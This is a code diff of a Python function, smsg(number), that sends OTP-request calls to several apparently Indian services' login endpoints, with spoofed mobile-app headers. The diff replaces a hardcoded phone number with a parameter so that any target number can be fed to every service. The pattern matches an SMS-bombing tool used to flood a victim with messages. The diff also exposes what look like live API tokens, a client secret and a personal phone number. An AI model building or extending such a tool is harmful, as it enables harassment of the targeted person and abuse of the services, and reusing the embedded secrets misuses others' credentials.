@@ -30,7 +30,7 @@ def smsg(number):
                 "priority": "u=1, i"
             },
             "data": {
-                "username": "+919336734442",
+                "username": "+91"+number,
                 "wsfunction": "auth_otp_request_otp",
                 "wstoken": "b9749ed9fefb5ec57dad6c05d93ab6da"
             }
@@ -54,7 +54,7 @@ def smsg(number):
                 "priority": "u=1, i"
             },
             "params": {
-                "mobileno": "9336734442"
+                "mobileno": number
             }
         },
         {
@@ -74,7 +74,7 @@ def smsg(number):
                 "user-agent": "okhttp/4.12.0"
             },
             "data": {
-                "phone": "+919336734442",
+                "phone": "+91"+number,
                 "scope": "client",
                 "client_secret": "lkvAyfrqjA7Z18bjSxayYbvdD7ALJO9QYHYgPATw",
                 "client_id": "2"
@@ -103,7 +103,7 @@ def smsg(number):
                 "geo_lat": "",
                 "geo_long": "",
                 "is_existing_customer": 0,
-                "mobile": "9336734442",
+                "mobile": number,
                 "pancard": "",
                 "utm_campaign": "",
                 "utm_medium": "",
@@ -123,7 +123,7 @@ def smsg(number):
                 "User-Agent": "okhttp/4.2.2"
             },
             "data": {
-                "mobile": "9336734442"
+                "mobile": number
             }
         },
         {
@@ -137,7 +137,7 @@ def smsg(number):
                 "user-agent": "okhttp/3.12.0"
             },
             "data": {
-                "contact": "+919336734442",
+                "contact": "+91"+number,
                 "device_id": "c7abc1fd7459e84c"
             }
         },
@@ -153,7 +153,7 @@ def smsg(number):
                 "User-Agent": "okhttp/4.10.0"
             },
             "data": {
-                "phone": "9336734442"
+                "phone": number
             }
         },
         {
